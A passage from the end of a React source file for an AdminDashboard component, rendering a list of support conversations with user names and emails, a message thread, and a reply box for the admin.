                          key={conversation.id}
                          className={`p-3 rounded-lg border cursor-pointer transition-colors ${
                            selectedConversation === conversation.id
                              ? "bg-primary/10 border-primary"
                              : "hover:bg-secondary/50"
                          }`}
                          onClick={() => {
                            setSelectedConversation(conversation.id);
                            fetchConversationMessages(conversation.id);
                          }}
                        >
                          <div className="flex justify-between items-start">
                            <div>
                              <p className="font-medium">
                                {conversation.user_profile?.first_name} {conversation.user_profile?.last_name}
                              </p>
                              <p className="text-sm text-muted-foreground">
                                {conversation.user_profile?.email}
                              </p>
                            </div>
                            <Badge variant={conversation.status === 'open' ? 'default' : 'secondary'}>
                              {conversation.status}
                            </Badge>
                          </div>
                          <p className="text-xs text-muted-foreground mt-1">
                            {new Date(conversation.updated_at).toLocaleDateString()}
                          </p>
                        </div>
                      ))
                    )}
                  </div>
                </CardContent>
              </Card>

              {selectedConversation && (
                <Card>
                  <CardHeader>
                    <CardTitle>Messages</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-4 max-h-96 overflow-y-auto">
                      {conversationMessages.map((message) => (
                        <div
                          key={message.id}
                          className={`p-3 rounded-lg ${
                            message.sender_type === 'admin'
                              ? "bg-primary/10 ml-4"
                              : "bg-secondary/50 mr-4"
                          }`}
                        >
                          <p className="text-sm">{message.message}</p>
                          <p className="text-xs text-muted-foreground mt-1">
                            {message.sender_type === 'admin' ? 'You' : 'User'} •{' '}
                            {new Date(message.created_at).toLocaleString()}
                          </p>
                        </div>
                      ))}
                    </div>

                    <Separator className="my-4" />

                    <div className="space-y-2">
                      <Textarea
                        placeholder="Type your response..."
                        value={newMessage}
                        onChange={(e) => setNewMessage(e.target.value)}
                        rows={3}
                      />
                      <Button onClick={sendMessage} disabled={!newMessage.trim()}>
                        Send Message
                      </Button>
                    </div>
                  </CardContent>
                </Card>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default AdminDashboard;